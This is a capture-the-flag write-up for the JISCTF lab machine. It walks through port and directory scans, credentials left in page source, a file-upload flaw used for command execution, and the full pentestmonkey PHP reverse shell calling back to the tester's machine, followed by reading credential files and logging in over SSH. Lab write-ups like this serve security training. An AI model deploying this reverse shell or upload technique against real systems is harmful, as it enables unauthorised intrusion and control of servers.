## JISCTF

The goal for this box is to find all Five Flags.

* * *

**Finding the Box** 10.0.0.131
![Optional Text](/JISCTF/_resources/3b95ee466e2e4116b7ae60b3f9475a9c)

* * *

## Nmap

* * *

- `nmap -sC -sV -oA nmapscans/jisctf 10.0.0.131`

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-23 09:05 EDT
Nmap scan report for 10.0.0.131
Host is up (0.00058s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 af:b9:68:38:77:7c:40:f6:bf:98:09:ff:d9:5f:73:ec (RSA)
|   256 b9:df:60:1e:6d:6f:d7:f6:24:fd:ae:f8:e3:cf:16:ac (ECDSA)
|_  256 78:5a:95:bb:d5:bf:ad:cf:b2:f5:0f:c0:0c:af:f7:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 8 disallowed entries 
| / /backup /admin /admin_area /r00t /uploads 
|_/uploaded_files /flag
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Sign-Up/Login Form
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.66 seconds
```

* * *

Got some ports to check out but lets run DIRB and NIKTO before we do

* * *

## DIRB

* * *

dirb http://10.0.0.131:80/ /home/doxg/Downloads/wordlist/dirb-kali-master/wordlists/common.txt -o dirbscans/jisctf

```
GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.0.131:80/ ----
==> DIRECTORY: http://10.0.0.131:80/admin_area/                                          
==> DIRECTORY: http://10.0.0.131:80/assets/                                              
==> DIRECTORY: http://10.0.0.131:80/css/                                                 
==> DIRECTORY: http://10.0.0.131:80/flag/                                                
+ http://10.0.0.131:80/index.php (CODE:302|SIZE:1228)                                    
==> DIRECTORY: http://10.0.0.131:80/js/                                                  
+ http://10.0.0.131:80/robots.txt (CODE:200|SIZE:160)                                    
+ http://10.0.0.131:80/server-status (CODE:403|SIZE:298)                                 
                                                                                         
---- Entering directory: http://10.0.0.131:80/admin_area/ ----
+ http://10.0.0.131:80/admin_area/index.php (CODE:200|SIZE:224)                          
                                                                                         
---- Entering directory: http://10.0.0.131:80/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                         
---- Entering directory: http://10.0.0.131:80/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                         
---- Entering directory: http://10.0.0.131:80/flag/ ----
+ http://10.0.0.131:80/flag/index.html (CODE:200|SIZE:109)                               
                                                                                         
---- Entering directory: http://10.0.0.131:80/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Mar 23 09:12:50 2021
DOWNLOADED: 13836 - FOUND: 5
```

* * *

## NIKTO

* * *

```
doxg@doxg0:~$ nikto -h 10.0.0.131 -o niktoscans/jisctf.html
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.0.0.131
+ Target Hostname:    10.0.0.131
+ Target Port:        80
+ Start Time:         2021-03-23 09:16:19 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ Cookie PHPSESSID created without the httponly flag
+ Root page / redirects to: login.php
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0xa0 0x54d829805215a 
+ File/dir '/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ File/dir '/admin_area/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/uploaded_files/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ File/dir '/flag/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 8 entries which should be manually viewed.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 6544 items checked: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-03-23 09:16:24 (GMT-4) (5 seconds)
---------------------------------------------------------------------------
```

Looking at the nikto and dirb scans, I see some interesting places. First I took a look at the /flag directory, and without surprise I find our first flag!

![2ff5e3b69ae89f9b81a8fa9b71d982bd.png](:/d36ae60f6f39469e83c7c61a6c631b5a)

Next I look at `http://10.0.0.131/admin_area` and after inspecting the source I find some delightful credentials
![ce1aa6efac65c9de9f32b79e3994b2c5.png](:/c446379faec643b395474a35fab90d38)

- `admin`
- `3v1l_H@ck3r`

* * *

The "robots.txt" has some promising entries, will keep this in mind for now!
![1e468af160afb2756b6d7e27b76821db.png](:/0757f6a59b1449a4b295b5d914801809)

* * *

## Login Into Web App

I was able to login using the creds I found eariler on the `http://10.0.0.131/login.php`
![3ac9b19400fbf1b27da445a26fe247fc.png](:/18d8cdf37c994da0ad1d0b5c3912ed0c)
Once Logged in, it looks like a file a file upload
![c7a993a952ea454c66c87b3aea8290ac.png](:/ac747f1f4a954b45bee37746ea9aec2f)
I uploaded a File, and it **returned "Success" in the top left** to confirm we we use uploaded_files, this was found in the robots.txt earlier

**Succes!** **I was able to upload an image!**
![074f79abca9706d39e60f7510190372f.png](:/2cbc58cd826445df90befc40c4cbd989)

Next I will try to get command execution

## Command Execution

After failing a few times the code snippet below worked
**![fd31a6b980839baac717a8513fde236b.png](:/ef8e2ba4c08d4607bfe582b3e6ee5c29)**
Resource to code snippet `https://www.w3resource.com/php-exercises/php-basic-exercise-17.php`

1.  First, save the code to a php file in my case **sat.php**
2.  Then, Upload Load the file like before thru the file upload page
3.  Last, Navigate to IPofVM/uploaded_files/sat.php

**Success!!!**
![30e3c266d3855f447a5454822c1a8c9d.png](:/813c0e3cf9864a7a8476a171355cc79c)

Next I want to upload a Reverse Shell!

Reverse Shell

To save time here I will use the good old "**Pentest Monkey Reverse Shell**". I tested several others that worked, but was unable to get a python shell.

Rember to change the IP and port to your machine and whatever port you are listening on

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.0.0.186';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    
    if ($pid) {
        exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}

?>
```

1.  Once again I save the file in my case **got.php**
2.  Start my netcat listener `nc -nvlp 4444`
    ![a96cfb780a825d80fb28a7f67fd371c9.png](:/ed527a7a9d594eca8aeb7bb8c05defc4)
3.  Uploaded the file thru the file upload page
4.  Go to IPofVM/uploaded_files/got.php

**Success!!! We have a shell!!**
![920685a9288a6d2417958d920ba1dca0.png](:/30b0c34ccbbf43db9d65b043836991b7)

* * *

## In our Shell

I cat the /etc/passwd

```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
technawi:x:1000:1000:technawi,,,:/home/technawi:/bin/bash
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
```

I can see the **technawi** user in the /etc/passwd. But After some digging I had no luck. I decided to search for flags by literally searching for flag,flags,.etc.

After many attempts, I was finally lucky with `find . -name flag | grep -v 'Permission'` Keep in mind, giving our limted shell it only prints the relevant files at the end. `/var/www/html/flag`

![59891e564230b39627e7066a13d40e4e.png](:/eba408d26092494e89bf347044de04c9)

Thinking this was the **flag** we saw eariler I ls -alt the dir.

![7bbfa751e8b0acd3a91c6f87240df315.png](:/8203a01466cf4ba6b2b40c10bdee39c7)

I notice a "flag" file, flag directory, and a hint!

No luck on flag.txt
![9664c8e80a2b8adffefa24daa7fe1504.png](:/925f4d4afc97472c916f01968baf5bf1)

but on the hint......

## Hint

![ff6d4d1b0bc3d0f5df45b68337596819.png](:/10811e7fb2c04386b40c21411451ab3c)

```
try to find user technawi password to read the flag.txt file, you can find it in a hidden file ;)

The 3rd flag is : {7645110034526579012345670}
```

The hint seemed to be referencing hidden files for the user technawi. After running `find / -user technawi | grep -v 'Permission'`

**Finally Something!!**
A very Promising File

`/etc/mysql/conf.d/credentials.txt`
`cat /etc/mysql/conf.d/credentials.txt`

![8085dc2c83eb33935cafbd9c2447afea.png](:/1491449acd004e7e81db0b85bad4c223)

```
The 4th flag is : {7845658974123568974185412}

username : technawi
password : 3vilH@ksor
```

## Only one More Flag left

Since the last creds didn't work for ssh I decided to try technawi.

### SSH Success!

![95cf76e60a2dff8689d5362518706914.png](:/ea6d095c2ac04cd8b6e755e18ba84790)

Let see if we can read the file
![1e3ad5e58717fdfaaab2426380a8b911.png](:/da4093d558284e31b3a4102659a93b55)

We can!

```
The 5th flag is : {5473215946785213456975249}

Good job :)

You find 5 flags and got their points and finish the first scenario....
```

**Overall Thoughts**
